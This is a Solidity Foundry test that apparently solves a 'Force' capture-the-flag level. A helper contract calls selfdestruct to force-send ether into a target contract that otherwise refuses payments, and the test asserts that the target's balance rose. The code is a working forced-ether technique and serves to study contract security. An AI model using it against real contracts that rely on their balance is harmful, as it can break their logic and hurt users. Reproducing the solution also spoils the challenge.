// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Force} from "../../src/Force/Force.sol";

contract ForceTest is Test {
    Force public force;
    PushFunds public pushFunds;

    function setUp() public {
        force = new Force();
        pushFunds = new PushFunds{value: 1 ether}();
    }

    function test_forcePushBalance() public {
        uint256 balanceBefore = address(force).balance;
        pushFunds.pushFunds(payable(address(force)));
        uint256 balanceAfter = address(force).balance;

        assert(balanceAfter > balanceBefore);
    }
}

contract PushFunds {
    constructor() payable {}

    function pushFunds(address payable _to) external {
        selfdestruct(_to);
    }
}
